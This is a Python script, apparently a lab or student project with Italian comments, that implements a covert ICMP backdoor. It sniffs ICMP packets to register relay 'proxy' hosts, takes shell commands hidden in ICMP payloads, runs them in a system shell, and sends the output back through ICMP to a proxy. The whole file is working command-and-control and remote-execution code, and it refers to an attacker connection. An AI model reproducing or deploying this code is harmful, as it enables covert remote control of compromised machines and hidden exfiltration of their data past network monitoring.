#from scapy.all import *
from scapy.all import IP, ICMP,Raw, sr1, AsyncSniffer 

import threading 
import argparse
import mymethods
import time 
import comunication_methods as com
import re
import random
import sys
import select

sniffed_data=None    

#--Parte 2--# 
def done_waiting_timeout():
    if len(proxy_ip)>= num_proxy: 
        print("Timeout: Enough proxy has arrived")
        com.sniffer.stop() 
        com.set_pkt_conn_received()
    else:
        print("Timeout: Not enough proxy has arrived")
        global timeout_done_waiting
        timeout_done_waiting = threading.Timer(60, done_waiting_timeout)

def callback_conn_from_proxy(packet): 
    print("Packet received: {}".format(packet.summary())) 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        if packet[IP].src in proxy_ip:
            print(f"proxy:{packet[IP].src}\t{proxy_ip}")
            return
        print(f"CONNECT in msg:{com.CONNECT.encode() in packet[Raw].load}")
        if com.CONNECT.encode() in packet[Raw].load: 
            if com.send_packet(com.CONFIRM_PROXY.encode(),packet[IP].src):
                proxy_ip.append(packet[IP].src) if packet[IP].src not in proxy_ip else None
                print("Proxy: {}".format(packet[IP].src)) 
                print(f"Proxy IPs: {proxy_ip}") 
            else: 
                print(f"No reply: {packet[IP].src} is not responding")
            print(f"Necessari ancora {num_proxy-len(proxy_ip)} proxy")
        if len(proxy_ip)>= num_proxy:
            com.timeout_timer.cancel() 
            com.set_pkt_conn_received() 

def conn_from_proxy(): 
    args={
        "filter":f"icmp and dst {ip_host}" 
        #,"count":1 
        ,"prn":callback_conn_from_proxy 
        #,"store":True 
        ,"iface":mymethods.iface_from_IPv4(gateway_host)[1] 
    }
    com.sniff_packet(args,None) 
    global timeout_done_waiting
    timeout_done_waiting = threading.Timer(60, done_waiting_timeout)
    timeout_done_waiting.start() 
    com.wait_pkt_conn_received() 
    if com.sniffer.running: 
        com.sniffer.stop() 
    if timeout_done_waiting.is_alive(): 
        timeout_done_waiting.cancel()
    if com.timeout_timer.is_alive(): 
        com.timeout_timer.cancel() 
    print(f"I proxy utilzzabili sono: {len(proxy_ip)}\n\t{proxy_ip}") 

#--Parte 1--#
def choose_proxy():
    return random.choice(proxy_ip)

def get_value_of_parser(args):
    print(args) 
    if not isinstance(args, argparse.Namespace) or args is None:
        print("Nessun argomento passato") 
        return False 
    global ip_host, gateway_host
    ip_host=args.ip_host
    gateway_host=mymethods.calc_gateway(ip_host)

    global num_proxy
    num_proxy=args.num_proxy

def check_value_in_parser(args): 
    if not isinstance(args, argparse.Namespace) or args is None:
        print("Nessun argomento passato") 
        return False
    if type(args.ip_host) is not str or re.match(com.ip_reg_pattern, args.ip_host) is None:
        print("Devi specificare l'IP del host con --ip_host")
        mymethods.print_parser_supported_arguments(parser)
        return False
    if args.num_proxy is None or type(int(args.num_proxy)) is not int:
        print("Il numero di proxy non è un intero")
        return False
    return True

def get_args_from_parser():
    global parser
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip_host",type=str, help="L'IP dell host dove ricevere i pacchetti ICMP")
    parser.add_argument("--num_proxy",type=int, help="Numero dei proxy possibili")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    return mymethods.check_args(parser)

def def_global_variables():
    global proxy_ip
    proxy_ip=[]

#-- Main --#
def part_1():
    #1) Definizione degli argomenti
    try:
        def_global_variables()
        args=get_args_from_parser()
        if not check_value_in_parser(args): 
            exit(0) 
        get_value_of_parser(args)
    except Exception as e: 
        print(f"Eccezione: {e}")
        exit(1)
    #2) Connessione con tutti i proxy
    try:
        print("\tconn_from_proxy")
        conn_from_proxy()
    except Exception as e:
        print(f"An Exception has occured: {e}") 
        exit(1)

#---------------
def send_data_to_proxies(data_to_send:list=None,ip_dst=None):
    if data_to_send==None:
        raise ValueError("Dati incorretti")
    if not isinstance(ip_dst,str) or re.match(com.ip_reg_pattern, ip_dst) is None:
        raise ValueError("send_data_to_proxies: IP non valido ",ip_dst) 
    print("I dati che verranno mandati a", ip_dst," sono: ",data_to_send) 
    data_has_being_sent=False
    sequenza=0
    for data in data_to_send:
        if isinstance(data,bytes):
            data_has_being_sent=com.send_packet(data,ip_dst,icmp_seq=sequenza)
        else:
            data_has_being_sent=com.send_packet(data.encode(),ip_dst,icmp_seq=sequenza)
        if not data_has_being_sent:
            print("Il proxy ",ip_dst, " non ha ricevuto ",data)
        #if data_has_being_sent:
            #print(f"Dati mandati a {ip_dst}")
        sequenza+=1

def get_data_from_command(shell_process):
    print(f"Did command failed? {shell_process.poll()}")
    continue_read=shell_process.poll() is None
    data=[]
    while continue_read: 
        reads = [shell_process.stdout.fileno(), shell_process.stderr.fileno()]
        ret = select.select(reads, [], [])
        for fd in ret[0]:
            if fd == shell_process.stdout.fileno():
                output_line = shell_process.stdout.readline()
                if output_line:
                    data.append(output_line)
                    print("stdout:", output_line, end='')
                if output_line.strip() == "__END__".strip():
                    print(f"No more lines")
                    continue_read=False
                    break
                if not output_line:
                    print(f"EOF {output_line}") 
                    continue_read=False
                    break
            if fd == shell_process.stderr.fileno():
                error_line = shell_process.stderr.readline()
                if error_line:
                    data.append(error_line)
                    print("stderr:", error_line, end='')
        #if shell_process.poll() is not None:
            #break 
    print(f"Command finished with exit code {shell_process.poll()}")
    return data

def execute_command(command): 
    if isinstance(command, bytes):
        command=command.decode()
    #if not isinstance(command, str):
        #command=str(command) 
    supportedSystems=["linux","win32"] 
    if sys.platform not in supportedSystems:
        print(f"Sistema {sys.platform} non supportato...")
        exit(1)
    print("Sistema supportato...")
    try:
        shell_process=mymethods.getShellProcess()
    except Exception as e:
        print(f"Errore nell'apertura della shell: {e}")
        shell_process=None
    if shell_process is None:
        print("Errore nell'apertura della shell")
        exit(1)
    print("Shell aperta con successo...")
    print(f"Esecuzione comando: {command}")
    shell_process.stdin.write(f"{command.replace('\n','' '')}; echo {com.LAST_PACKET} \n")
    shell_process.stdin.flush() 
    try:
        return get_data_from_command(shell_process)
    except Exception as e:
        print(f"get_data_from_command: {e}")
    
    #shell_process.wait()  # Attende la chiusura del processo
    #shell_process.terminate()  # Termina il processo

def callback_receive_command(packet):
    global command
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        checksum=mymethods.calc_checksum(packet[Raw].load)
        print(f"Payload received:\t{packet[Raw].load}")
        print(f"ICMP ID:\t{packet[ICMP].id}")
        print(f"Checksum:\t{checksum}")
        if packet[ICMP].id==checksum:
            command=packet[Raw].load
            com.set_pkt_conn_received() 

def part_2():
    global command 
    global ip_host, gateway_host
    ip_host="192.168.56.102"
    gateway_host="192.168.56.0"
    command=None
    print("Waiting for a command...")
    args={
        "filter":f"icmp and dst {ip_host}" 
        #,"count":1 
        ,"prn":callback_receive_command 
        #,"store":True 
        ,"iface":mymethods.iface_from_IPv4(gateway_host)[1] 
    }
    com.sniff_packet(args,None) 
    com.wait_pkt_conn_received() 
    print(f"Comando ricevuto: {command}")
    if com.sniffer.running: 
        com.sniffer.stop() 
    if com.timeout_timer.is_alive(): 
        com.timeout_timer.cancel() 
        try:
            data=execute_command(command.decode())
            chosen_proxy=choose_proxy()
            print("Ip host è ",proxy_ip)
            print("Proxy scelto è ",chosen_proxy)
            send_data_to_proxies(data,chosen_proxy)
        except Exception as e:
            print(f"part_2: execute_command: {e}") 
    print(f"I proxy utilzzabili sono: {len(proxy_ip)}\n\t{proxy_ip}") 

if __name__=="__main__":
    #global proxy_ip
    #proxy_ip=["192.168.56.101"]
    part_1()
    exit(0)
    part_2()
    exit(0) 
    #thread = threading.Thread(target=sniff_4_start)
    #thread.start()
    conn_attaccante()

